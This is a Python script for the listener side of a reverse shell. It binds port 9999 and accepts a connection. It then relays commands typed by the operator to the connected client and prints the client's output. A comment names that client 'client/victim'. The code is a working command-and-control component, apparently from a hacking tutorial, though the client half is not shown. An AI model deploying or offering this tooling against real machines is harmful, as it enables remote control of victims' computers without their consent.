import socket
import sys

# Create a socket -- connect two computers

def create_socket():
    try:
        global host
        global port 
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Select creation error: " + str(msg))

# Binding socket and listening to a connection

def bind_socket():
     try:
        global host
        global port 
        global s

        print("Binding the Port " + str(port))

        s.bind((host,port))
        s.listen(5)

     except socket.error as msg:
        print("Select Binding error: " + str(msg) +"\n"+ "Retrying...")
        bind_socket()

# Establishing a connection with a client -- socket must be listening

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port " + str(address[1]))
    send_command(conn)
    conn.close()

# Send command to client/victim or a friend
def send_command(conn):
    while True: #infinite loop connection closed at any point
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
